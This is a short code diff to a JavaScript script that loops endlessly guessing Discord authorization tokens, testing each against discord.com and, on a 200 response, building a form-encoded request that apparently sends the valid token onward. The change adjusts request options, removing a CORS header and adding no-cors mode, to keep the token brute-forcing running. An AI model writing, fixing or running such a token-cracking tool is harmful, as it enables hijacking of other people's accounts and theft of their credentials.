@@ -30,9 +30,8 @@
     while(true){
       guess = gentoken1()
       fetch('https://discord.com/login', {'headers':{
-        'Authorization': guess,
-        "Access-Control-Allow-Origin":"*"
-      }}).then(res => {
+        'Authorization': guess
+      }, 'mode':'no-cors'}).then(res => {
         if(res.status == 200){
           var myHeaders = new Headers();
           myHeaders.append("Content-Type", "application/x-www-form-urlencoded");
@@ -53,9 +52,8 @@
       })
       guess = gentoken2()
       fetch('https://discord.com/login', {'headers':{
-        'Authorization': guess,
-        "Access-Control-Allow-Origin":"*"
-      }}).then(res => {
+        'Authorization': guess
+      }, 'mode':'no-cors'}).then(res => {
         if(res.status == 200){
           var myHeaders = new Headers();
           myHeaders.append("Content-Type", "application/x-www-form-urlencoded");
